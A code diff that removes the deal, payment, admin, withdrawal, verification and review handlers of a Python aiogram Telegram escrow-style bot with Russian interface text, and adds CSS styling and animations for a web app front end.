-💰 RUB: {bal.get('rub', 0)}
-🌐 UAH: {bal.get('uah', 0)}
-
-📊 Сделок завершено: {sum(bal.get('deal_partners', {}).values())}"""
-    await callback.message.edit_text(
-        text,
-        reply_markup=back_to_main_keyboard(callback.from_user.id)
-    )
-    await callback.answer()
-
-@dp.callback_query(lambda c: c.data == "menu_deals")
-async def menu_deals(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    user_deals = []
-    for d_id, d in deals.items():
-        if d.get("seller_id") == callback.from_user.id or d.get("buyer_id") == callback.from_user.id:
-            user_deals.append((d_id, d))
-    if not user_deals:
-        await callback.message.edit_text(
-            f"📭 {get_text(lang, 'no_deals')}",
-            reply_markup=back_to_main_keyboard(callback.from_user.id)
-        )
-        return
-    text = f"📊 <b>{get_text(lang, 'your_deals')}</b>\n\n"
-    for d_id, d in user_deals[-10:]:
-        status_map = {
-            "waiting_payment": f"⏳ {get_text(lang, 'status_waiting')}",
-            "paid": f"✅ {get_text(lang, 'status_paid')}",
-            "awaiting_confirmation": f"📦 {get_text(lang, 'status_awaiting')}",
-            "completed": f"🎉 {get_text(lang, 'status_completed')}"
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            padding: 16px;
+            background-image: radial-gradient(ellipse at 20% 20%, rgba(0,152,234,0.08) 0%, transparent 50%), radial-gradient(ellipse at 80% 80%, rgba(240,185,11,0.04) 0%, transparent 50%);
+            padding-bottom: 90px;
+            overflow-x: hidden;
         }
-        text += f"#{d_id} | {status_map.get(d['status'], d['status'])} | {d['amount']} {d['currency']}\n"
-        text += f"   → {d['product'][:30]}\n\n"
-    await callback.message.edit_text(
-        text,
-        reply_markup=back_to_main_keyboard(callback.from_user.id)
-    )
-    await callback.answer()
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: var(--bg-primary); }
+        ::-webkit-scrollbar-thumb { background: var(--ton-blue); border-radius: 10px; }
+        @keyframes float { 0%,100% { transform: translateY(0px); } 50% { transform: translateY(-8px); } }
+        @keyframes pulse-ring { 0%,100% { box-shadow: 0 0 0 0 rgba(0,152,234,0.3); } 50% { box-shadow: 0 0 0 20px rgba(0,152,234,0); } }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes spin-slow { to { transform: rotate(360deg); } }
+        .animate-float { animation: float 4s ease-in-out infinite; }
 
-@dp.callback_query(lambda c: c.data == "menu_reviews")
-async def menu_reviews(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    reviews_list = list(reviews.values())
-    
-    if not reviews_list:
-        text = f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\nПока нет отзывов"
-    else:
-        text = f"⭐️ <b>{get_text(lang, 'faq')}</b> (всего: {len(reviews_list)})\n\n"
-        for r in reviews_list[-10:]:
-            user = r.get('user', 'Аноним')
-            rating = '⭐' * r.get('rating', 5)
-            text += f"👤 <b>{user}</b> | {rating}\n"
-            text += f"📝 {r.get('text', '')[:150]}\n"
-            text += f"🕐 {r.get('date', 'недавно')}\n\n"
-    
-    await callback.message.edit_text(
-        text[:4000],
-        reply_markup=back_to_main_keyboard(callback.from_user.id)
-    )
-    await callback.answer()
-
-# ============================================================
-# 11. СДЕЛКИ
-# ============================================================
-async def handle_deal_link(message: types.Message, deal_id: str):
-    lang = get_user_language(message.from_user.id)
-    if deal_id not in deals:
-        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
-        return
-
-    deal = deals[deal_id]
-    if deal["status"] != "waiting_payment":
-        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
-        return
-
-    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
-        await message.answer(
-            f"❌ {get_text(lang, 'access_denied')}!\n\n"
-            f"{get_text(lang, 'deal')} #{deal_id} {get_text(lang, 'for_user')} @{deal['buyer_username']}"
-        )
-        add_log("unauthorized_deal_attempt", {
-            "user_id": message.from_user.id,
-            "username": message.from_user.username,
-            "deal_id": deal_id,
-            "expected_buyer": deal["buyer_username"]
-        })
-        return
-
-    deal["buyer_id"] = message.from_user.id
-    save_json(FILES["deals"], deals)
-    
-    add_log("buyer_entered_deal", {
-        "user_id": message.from_user.id,
-        "username": message.from_user.username,
-        "deal_id": deal_id,
-        "product": deal["product"],
-        "amount": deal["amount"],
-        "currency": deal["currency"]
-    })
-
-    await message.answer(
-        f"✈️ <b>{get_text(lang, 'deal')} #{deal_id}</b>\n\n"
-        f"📦 {get_text(lang, 'product')}: {deal['product']}\n"
-        f"💰 {get_text(lang, 'amount')}: {deal['amount']} {deal['currency']}\n"
-        f"👤 {get_text(lang, 'seller')}: @{deal['seller_username']}\n\n"
-        f"⬇️ {get_text(lang, 'choose_payment_method')} ⬇️",
-        reply_markup=payment_method_keyboard(deal_id, message.from_user.id)
-    )
-
-@dp.callback_query(lambda c: c.data.startswith("pay_rekvisits_"))
-async def pay_by_rekvisits(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    deal_id = callback.data.split("_")[2]
-    if deal_id not in deals:
-        await callback.answer(f"❌ {get_text(lang, 'deal_not_found')}")
-        return
-    deal = deals[deal_id]
-    
-    add_log("user_viewed_rekvisits", {
-        "user_id": callback.from_user.id,
-        "username": callback.from_user.username,
-        "deal_id": deal_id,
-        "amount": deal["amount"],
-        "currency": deal["currency"]
-    })
-    
-    await callback.message.edit_text(
-        f"💳 <b>{get_text(lang, 'payment_details')}</b>\n\n"
-        f"Оплатите {deal['amount']} {deal['currency']}\n"
-        f"После оплаты напишите админу: /pay {deal_id}",
-        reply_markup=back_to_main_keyboard(callback.from_user.id)
-    )
-    await callback.answer()
-
-@dp.callback_query(lambda c: c.data.startswith("pay_balance_"))
-async def pay_by_balance(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    deal_id = callback.data.split("_")[2]
-    if deal_id not in deals:
-        await callback.answer(f"❌ {get_text(lang, 'deal_not_found')}")
-        return
-    deal = deals[deal_id]
-    if deal["status"] != "waiting_payment":
-        await callback.answer(f"❌ {get_text(lang, 'deal_not_found')}")
-        return
-    
-    buyer_balance = get_balance(callback.from_user.id)
-    curr_key = deal["currency"].lower()
-    if buyer_balance.get(curr_key, 0) < deal["amount"]:
-        await callback.answer(f"❌ {get_text(lang, 'insufficient_balance')}!", show_alert=True)
-        add_log("insufficient_balance_payment_attempt", {
-            "user_id": callback.from_user.id,
-            "username": callback.from_user.username,
-            "deal_id": deal_id,
-            "amount": deal["amount"],
-            "currency": deal["currency"],
-            "balance": buyer_balance.get(curr_key, 0)
-        })
-        return
-    
-    buyer_balance[curr_key] -= deal["amount"]
-    save_json(FILES["balance"], balance)
-    deal["status"] = "paid"
-    deal["paid_by_admin"] = callback.from_user.id
-    save_json(FILES["deals"], deals)
-    
-    add_log("deal_paid_by_balance", {
-        "user_id": callback.from_user.id,
-        "username": callback.from_user.username,
-        "deal_id": deal_id,
-        "amount": deal["amount"],
-        "currency": deal["currency"]
-    })
-    
-    await callback.message.edit_text(
-        f"✅ {get_text(lang, 'payment_confirmed')}!\n\n"
-        f"{get_text(lang, 'deal')} #{deal_id}\n"
-        f"💰 {get_text(lang, 'funds_deducted')}: {deal['amount']} {deal['currency']}",
-        reply_markup=back_to_main_keyboard(callback.from_user.id)
-    )
-    
-    try:
-        seller_lang = get_user_language(deal["seller_id"])
-        await bot.send_message(
-            deal["seller_id"],
-            f"💎 <b>{get_text(seller_lang, 'deal')} #{deal_id} {get_text(seller_lang, 'status_paid')}!</b>\n\n"
-            f"💰 {get_text(seller_lang, 'amount')}: {deal['amount']} {deal['currency']}\n"
-            f"👤 {get_text(seller_lang, 'buyer')}: @{deal['buyer_username']}\n\n"
-            f"⬇️ {get_text(seller_lang, 'seller_delivered')} ⬇️",
-            reply_markup=seller_confirm_keyboard(deal_id, deal["seller_id"])
-        )
-    except Exception as e:
-        print(f"Error: {e}")
-    
-    await callback.answer()
-
-@dp.callback_query(lambda c: c.data.startswith("seller_done_"))
-async def seller_done(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    deal_id = callback.data.split("_")[2]
-    if deal_id not in deals:
-        await callback.answer(f"❌ {get_text(lang, 'deal_not_found')}")
-        return
-    deal = deals[deal_id]
-    if deal["status"] != "paid":
-        await callback.answer(f"⏳ {get_text(lang, 'status_waiting')}")
-        return
-    deal["status"] = "awaiting_confirmation"
-    save_json(FILES["deals"], deals)
-    
-    add_log("seller_confirmed_delivery", {
-        "user_id": callback.from_user.id,
-        "username": callback.from_user.username,
-        "deal_id": deal_id,
-        "product": deal["product"],
-        "amount": deal["amount"],
-        "currency": deal["currency"],
-        "buyer": deal["buyer_username"]
-    })
-    
-    try:
-        await callback.message.edit_text(
-            f"✅ {get_text(lang, 'seller_confirmed')}!\n\n"
-            f"⏳ {get_text(lang, 'waiting_for_delivery')}"
-        )
-    except:
-        await callback.message.answer(
-            f"✅ {get_text(lang, 'seller_confirmed')}!"
-        )
-    
-    try:
-        buyer_lang = get_user_language(deal["buyer_id"])
-        await bot.send_message(
-            deal["buyer_id"],
-            f"📦 <b>{get_text(buyer_lang, 'seller_delivered')} {get_text(buyer_lang, 'deal')} #{deal_id}</b>\n\n"
-            f"💰 {get_text(buyer_lang, 'amount')}: {deal['amount']} {deal['currency']}\n"
-            f"👤 {get_text(buyer_lang, 'seller')}: @{deal['seller_username']}\n\n"
-            f"⬇️ {get_text(buyer_lang, 'confirm_receipt')} ⬇️",
-            reply_markup=buyer_confirm_keyboard(deal_id, deal["buyer_id"])
-        )
-    except:
-        pass
-    
-    await callback.answer()
-
-@dp.callback_query(lambda c: c.data.startswith("buyer_confirm_"))
-async def buyer_confirm(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    deal_id = callback.data.split("_")[2]
-    if deal_id not in deals:
-        await callback.answer(f"❌ {get_text(lang, 'deal_not_found')}")
-        return
-    deal = deals[deal_id]
-    if deal["status"] != "awaiting_confirmation":
-        await callback.answer(f"⏳ {get_text(lang, 'status_waiting')}")
-        return
-    
-    add_balance(deal["seller_id"], deal["currency"], deal["amount"])
-    seller_balance = get_balance(deal["seller_id"])
-    buyer = deal["buyer_username"]
-    if buyer not in seller_balance["deal_partners"]:
-        seller_balance["deal_partners"][buyer] = 0
-    seller_balance["deal_partners"][buyer] += 1
-    save_json(FILES["balance"], balance)
-    
-    deal["status"] = "completed"
-    deal["completed_at"] = datetime.now().isoformat()
-    save_json(FILES["deals"], deals)
-    
-    add_log("deal_completed", {
-        "user_id": callback.from_user.id,
-        "username": callback.from_user.username,
-        "deal_id": deal_id,
-        "product": deal["product"],
-        "amount": deal["amount"],
-        "currency": deal["currency"],
-        "seller": deal["seller_username"],
-        "buyer": deal["buyer_username"],
-        "completed_at": deal["completed_at"]
-    })
-    
-    await callback.message.edit_text(
-        f"🎉 <b>{get_text(lang, 'deal_completed')}</b> #{deal_id}!\n\n"
-        f"💳 {get_text(lang, 'funds_added_to_balance')} {deal['amount']} {deal['currency']}\n\n"
-        f"{get_text(lang, 'deal_completed_msg')}",
-        reply_markup=back_to_main_keyboard(callback.from_user.id)
-    )
-    
-    try:
-        seller_lang = get_user_language(deal["seller_id"])
-        await bot.send_message(
-            deal["seller_id"],
-            f"🎉 <b>{get_text(seller_lang, 'deal_completed')}</b> #{deal_id}!\n\n"
-            f"💰 {deal['amount']} {deal['currency']} {get_text(seller_lang, 'funds_added_to_balance')}"
-        )
-    except:
-        pass
-    
-    await callback.answer()
-
-@dp.callback_query(lambda c: c.data.startswith("support_"))
-async def support_callback(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    await callback.answer()
-    await callback.message.answer(
-        f"🆘 {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}"
-    )
-
-# ============================================================
-# 12. АДМИН ПАНЕЛЬ
-# ============================================================
-@dp.callback_query(lambda c: c.data == "menu_admin")
-async def menu_admin(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
-        return
-    await callback.message.edit_text(
-        f"👑 <b>{get_text(lang, 'admin_panel')}</b>\n\n{get_text(lang, 'choose_action')}:",
-        reply_markup=admin_panel_keyboard(callback.from_user.id)
-    )
-    await callback.answer()
-
-# ============================================================
-# 13. НАЧИСЛИТЬ БАЛАНС
-# ============================================================
-@dp.callback_query(lambda c: c.data == "admin_add_balance")
-async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
-    lang = get_user_language(callback.from_user.id)
-    if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
-        return
-    await callback.message.edit_text(f"💰 <b>{get_text(lang, 'balance_added')}</b>\n\n{get_text(lang, 'enter_user_id')}:")
-    await state.set_state(AdminStates.waiting_user_id)
-    await callback.answer()
-
-@dp.message(AdminStates.waiting_user_id)
-async def admin_get_user_id(message: types.Message, state: FSMContext):
-    lang = get_user_language(message.from_user.id)
-    try:
-        user_id = int(message.text.strip())
-        await state.update_data(target_user_id=user_id)
-        await message.answer(f"💱 {get_text(lang, 'choose_currency')}:", reply_markup=currency_keyboard())
-        await state.set_state(AdminStates.waiting_currency)
-    except:
-        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")
-
-@dp.callback_query(lambda c: c.data.startswith("curr_"))
-async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
-    lang = get_user_language(callback.from_user.id)
-    currency = callback.data.split("_")[1]
-    await state.update_data(target_currency=currency)
-    await callback.message.edit_text(f"💰 {get_text(lang, 'enter_amount')} {currency}:")
-    await state.set_state(AdminStates.waiting_amount)
-    await callback.answer()
-
-@dp.message(AdminStates.waiting_amount)
-async def admin_get_amount(message: types.Message, state: FSMContext):
-    lang = get_user_language(message.from_user.id)
-    try:
-        amount = float(message.text.strip())
-        if amount <= 0:
-            raise ValueError
-        data = await state.get_data()
-        target_user_id = data.get("target_user_id")
-        currency = data.get("target_currency")
-        add_balance(target_user_id, currency, amount)
-        add_log("admin_add_balance", {
-            "admin": message.from_user.username,
-            "target_user_id": target_user_id,
-            "amount": amount,
-            "currency": currency
-        })
-        await message.answer(
-            f"✅ {get_text(lang, 'balance_added')} {amount} {currency} {get_text(lang, 'for_user')} {target_user_id}",
-            reply_markup=admin_panel_keyboard(message.from_user.id)
-        )
-        await state.clear()
-    except:
-        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")
-
-# ============================================================
-# 14. УПРАВЛЕНИЕ АДМИНАМИ
-# ============================================================
-@dp.callback_query(lambda c: c.data == "admin_manage_admins")
-async def admin_manage_admins(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
-        return
-    admin_list = "\n".join([f"• {aid}" for aid in list(admins.keys())]) if admins else "Нет дополнительных админов"
-    await callback.message.edit_text(
-        f"👥 <b>{get_text(lang, 'admin_list')}</b>\n\n"
-        f"Главный админ: {MASTER_ADMIN_ID}\n"
-        f"Дополнительные:\n{admin_list}\n\n"
-        f"/add_admin [ID] - {get_text(lang, 'admin_added')}\n"
-        f"/remove_admin [ID] - {get_text(lang, 'admin_removed')}",
-        reply_markup=admin_panel_keyboard(callback.from_user.id)
-    )
-    await callback.answer()
-
-@dp.message(Command("add_admin"))
-async def add_admin(message: types.Message):
-    lang = get_user_language(message.from_user.id)
-    if message.from_user.id != MASTER_ADMIN_ID:
-        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
-        return
-    args = message.text.split()
-    if len(args) != 2:
-        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /add_admin [ID]")
-        return
-    try:
-        new_admin_id = int(args[1])
-        admins[str(new_admin_id)] = True
-        save_json(FILES["admins"], admins)
-        add_log("admin_added", {
-            "admin": message.from_user.username,
-            "new_admin_id": new_admin_id
-        })
-        await message.answer(f"✅ {get_text(lang, 'admin_added')} {new_admin_id}")
-    except:
-        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")
-
-@dp.message(Command("remove_admin"))
-async def remove_admin(message: types.Message):
-    lang = get_user_language(message.from_user.id)
-    if message.from_user.id != MASTER_ADMIN_ID:
-        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
-        return
-    args = message.text.split()
-    if len(args) != 2:
-        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /remove_admin [ID]")
-        return
-    try:
-        admin_id = int(args[1])
-        if admin_id == MASTER_ADMIN_ID:
-            await message.answer(f"❌ {get_text(lang, 'cannot_remove_master')}")
-            return
-        if str(admin_id) in admins:
-            del admins[str(admin_id)]
-            save_json(FILES["admins"], admins)
-            add_log("admin_removed", {
-                "admin": message.from_user.username,
-                "removed_admin_id": admin_id
-            })
-            await message.answer(f"✅ {get_text(lang, 'admin_removed')} {admin_id}")
-        else:
-            await message.answer(f"❌ {get_text(lang, 'user_not_found')}")
-    except:
-        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")
-
-# ============================================================
-# 15. ВСЕ СДЕЛКИ (АДМИН)
-# ============================================================
-@dp.callback_query(lambda c: c.data == "admin_all_deals")
-async def admin_all_deals(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
-        return
-    if not deals:
-        await callback.message.edit_text(f"📭 {get_text(lang, 'no_deals_total')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
-        return
-    text = f"📊 <b>{get_text(lang, 'all_deals_title')}</b>\n\n"
-    for d_id, d in list(deals.items())[-20:]:
-        status_map = {
-            "waiting_payment": f"⏳ {get_text(lang, 'status_waiting')}",
-            "paid": f"✅ {get_text(lang, 'status_paid')}",
-            "awaiting_confirmation": f"📦 {get_text(lang, 'status_awaiting')}",
-            "completed": f"🎉 {get_text(lang, 'status_completed')}"
+        .language-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(10,14,26,0.98);
+            backdrop-filter: blur(40px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            flex-direction: column;
+            gap: 24px;
+            padding: 24px;
         }
-        text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
-        text += f"   👤 {d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
-        text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n\n"
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
-    await callback.answer()
+        .language-overlay.active { display: flex; }
+        .language-overlay .logo-icon { font-size: 64px; animation: float 3s ease-in-out infinite; }
+        .language-overlay h1 { font-size: 32px; font-weight: 900; background: linear-gradient(135deg, var(--ton-blue), var(--gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-align: center; }
+        .language-overlay p { color: var(--text-secondary); font-size: 15px; text-align: center; font-weight: 300; }
+        .language-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; max-width: 380px; width: 100%; }
+        .lang-btn { padding: 18px; border: 1px solid var(--border-color); border-radius: var(--radius-sm); background: var(--bg-card); color: var(--text-primary); font-size: 15px; font-weight: 600; font-family: 'Inter', sans-serif; cursor: pointer; transition: all 0.35s; text-align: center; }
+        .lang-btn:hover { border-color: var(--ton-blue); transform: translateY(-3px); box-shadow: 0 12px 40px rgba(0,152,234,0.15); }
+        .lang-btn:active { transform: scale(0.97); }
 
-# ============================================================
-# 16. ЗАЯВКИ НА ВЫВОД (АДМИН)
-# ============================================================
-@dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
-async def admin_withdraw_requests(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
-        return
-    pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}
-    if not pending:
-        await callback.message.edit_text(f"📭 {get_text(lang, 'no_active_requests')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
-        return
-    text = f"💲 <b>Заявки на вывод</b>\n\n"
-    for rid, req in list(pending.items())[-10:]:
-        text += f"#{rid}\n   👤 ID: {req.get('user_id', '?')} (@{req.get('username', '?')})\n   💰 {req.get('amount', 0)} {req.get('currency', '')}\n   📝 {req.get('details', '')[:30]}\n   ➡️ /confirm_withdraw {rid}\n\n"
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
-    await callback.answer()
-
-# ============================================================
-# 17. ЗАПРОСЫ ВЕРИФИКАЦИИ (АДМИН)
-# ============================================================
-@dp.callback_query(lambda c: c.data == "admin_verification_requests")
-async def admin_verification_requests(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
-        return
-    pending = {k: v for k, v in verification_requests.items() if v.get("status") == "pending"}
-    if not pending:
-        await callback.message.edit_text(f"🔐 {get_text(lang, 'no_active_requests')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
-        return
-    text = f"🔐 <b>Запросы верификации</b>\n\n"
-    for rid, req in list(pending.items())[-10:]:
-        text += f"#{rid}\n   👤 @{req.get('username', '?')} (ID: {req.get('user_id', '?')})\n"
-        text += f"   📱 {req.get('phone', '?')}\n"
-        text += f"   ➡️ /approve_verification {rid}\n"
-        text += f"   ➡️ /reject_verification {rid}\n\n"
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
-    await callback.answer()
-
-@dp.message(Command("approve_verification"))
-async def approve_verification(message: types.Message):
-    lang = get_user_language(message.from_user.id)
-    if not is_admin(message.from_user.id):
-        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
-        return
-    args = message.text.split()
-    if len(args) != 2:
-        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /approve_verification [ID]")
-        return
-    request_id = args[1]
-    if request_id not in verification_requests:
-        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
-        return
-    req = verification_requests[request_id]
-    if req.get("status") != "pending":
-        await message.answer(f"❌ {get_text(lang, 'request_already_processed')}")
-        return
-    
-    session_id = str(uuid.uuid4())[:8]
-    verification_sessions[session_id] = {
-        "user_id": req["user_id"],
-        "username": req["username"],
-        "phone": req["phone"],
-        "created_at": datetime.now().isoformat(),
-        "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
-        "active": True
-    }
-    save_json(FILES["verification_sessions"], verification_sessions)
-    
-    req["status"] = "approved"
-    req["session_id"] = session_id
-    req["approved_at"] = datetime.now().isoformat()
-    save_json(FILES["verification"], verification_requests)
-    
-    add_log("verification_approved", {
-        "admin": message.from_user.username,
-        "user_id": req["user_id"],
-        "username": req["username"],
-        "phone": req["phone"],
-        "session_id": session_id
-    })
-    
-    await message.answer(f"✅ {get_text(lang, 'photo_updated')} #{request_id}")
-    
-    try:
-        user_lang = get_user_language(req["user_id"])
-        await bot.send_message(
-            req["user_id"],
-            f"✅ <b>ВЕРИФИКАЦИЯ ПРОЙДЕНА!</b>\n\n"
-            f"🕐 Сессия активна 24 часа.\n"
-            f"🆔 ID сессии: {session_id}\n\n"
-            f"💰 Теперь вам доступен вывод средств!"
-        )
-    except:
-        pass
-
-@dp.message(Command("reject_verification"))
-async def reject_verification(message: types.Message):
-    lang = get_user_language(message.from_user.id)
-    if not is_admin(message.from_user.id):
-        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
-        return
-    args = message.text.split()
-    if len(args) != 2:
-        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /reject_verification [ID]")
-        return
-    request_id = args[1]
-    if request_id not in verification_requests:
-        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
-        return
-    req = verification_requests[request_id]
-    if req.get("status") != "pending":
-        await message.answer(f"❌ {get_text(lang, 'request_already_processed')}")
-        return
-    
-    req["status"] = "rejected"
-    req["rejected_at"] = datetime.now().isoformat()
-    save_json(FILES["verification"], verification_requests)
-    
-    add_log("verification_rejected", {
-        "admin": message.from_user.username,
-        "user_id": req["user_id"],
-        "username": req["username"]
-    })
-    
-    await message.answer(f"❌ Запрос #{request_id} отклонён")
-
-# ============================================================
-# 18. УПРАВЛЕНИЕ ОТЗЫВАМИ
-# ============================================================
-@dp.callback_query(lambda c: c.data == "admin_manage_reviews")
-async def admin_manage_reviews(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
-        return
-    reviews_list = list(reviews.values())
-    if not reviews_list:
-        await callback.message.edit_text(f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\nПока нет отзывов", reply_markup=admin_panel_keyboard(callback.from_user.id))
-        return
-    text = f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\n"
-    for r in reviews_list[-10:]:
-        text += f"👤 {r.get('user', 'Аноним')} | {'⭐' * r.get('rating', 5)}\n"
-        text += f"📝 {r.get('text', '')[:50]}\n🆔 {r.get('id', '')}\n➡️ /delete_review {r.get('id', '')}\n\n"
-    await callback.message.edit_text(
-        text[:4000],
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text=f"🗑 Очистить все отзывы", callback_data="admin_clear_reviews")],
-            [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'admin_panel')}", callback_data="menu_admin")]
-        ])
-    )
-    await callback.answer()
-
-@dp.message(Command("delete_review"))
-async def delete_review_command(message: types.Message):
-    lang = get_user_language(message.from_user.id)
-    if not is_admin(message.from_user.id):
-        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
-        return
-    args = message.text.split()
-    if len(args) != 2:
-        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /delete_review [ID]")
-        return
-    review_id = args[1]
-    if review_id not in reviews:
-        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
-        return
-    del reviews[review_id]
-    save_json(FILES["reviews"], reviews)
-    add_log("review_deleted", {
-        "admin": message.from_user.username,
-        "review_id": review_id
-    })
-    await message.answer(f"✅ {get_text(lang, 'photo_updated')}")
-
-@dp.callback_query(lambda c: c.data == "admin_clear_reviews")
-async def admin_clear_reviews(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
-        return
-    reviews.clear()
-    save_json(FILES["reviews"], reviews)
-    add_log("all_reviews_cleared", {
-        "admin": callback.from_user.username
-    })
-    await callback.message.edit_text(f"✅ {get_text(lang, 'photo_updated')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
-    await callback.answer()
-
-# ============================================================
-# 19. ЛОГИ (АДМИН)
-# ============================================================
-@dp.callback_query(lambda c: c.data == "admin_logs")
-async def admin_logs(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
-        return
-    logs_list = list(logs.values())[-20:]
-    if not logs_list:
-        await callback.message.edit_text(f"📋 <b>Логи</b>\n\nНет записей", reply_markup=admin_panel_keyboard(callback.from_user.id))
-        return
-    text = "📋 <b>Последние логи</b>\n\n"
-    for log_entry in reversed(logs_list[-10:]):
-        text += f"🕐 {log_entry.get('time', '')[:19]}\n"
-        text += f"📌 {log_entry.get('action', '')}\n"
-        text += f"📊 {json.dumps(log_entry.get('data', {}), ensure_ascii=False)[:80]}\n\n"
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
-    await callback.answer()
-
-# ============================================================
-# 20. КОМАНДЫ АДМИНА
-# ============================================================
-@dp.message(Command("pay"))
-async def pay_command(message: types.Message):
-    lang = get_user_language(message.from_user.id)
-    if not is_admin(message.from_user.id):
-        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
-        return
-    args = message.text.split()
-    if len(args) != 2:
-        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /pay [ID]")
-        return
-    deal_id = args[1]
-    if deal_id not in deals:
-        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
-        return
-    deal = deals[deal_id]
-    if deal["status"] != "waiting_payment":
-        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
-        return
-    deal["status"] = "paid"
-    deal["paid_by_admin"] = message.from_user.id
-    save_json(FILES["deals"], deals)
-    
-    add_log("deal_paid_by_admin", {
-        "admin": message.from_user.username,
-        "deal_id": deal_id,
-        "amount": deal["amount"],
-        "currency": deal["currency"]
-    })
-    
-    await message.answer(f"✅ {get_text(lang, 'payment_confirmed')} #{deal_id}")
-    
-    try:
-        seller_lang = get_user_language(deal["seller_id"])
-        await bot.send_message(
-            deal["seller_id"],
-            f"💎 <b>{get_text(seller_lang, 'deal')} #{deal_id} {get_text(seller_lang, 'status_paid')}!</b>\n\n"
-            f"💰 {get_text(seller_lang, 'amount')}: {deal['amount']} {deal['currency']}\n"
-            f"👤 {get_text(seller_lang, 'buyer')}: @{deal['buyer_username']}\n\n"
-            f"⬇️ {get_text(seller_lang, 'seller_delivered')} ⬇️",
-            reply_markup=seller_confirm_keyboard(deal_id, deal["seller_id"])
-        )
-    except Exception as e:
-        print(f"Error: {e}")
-
-@dp.message(Command("confirm_withdraw"))
-async def confirm_withdraw_command(message: types.Message):
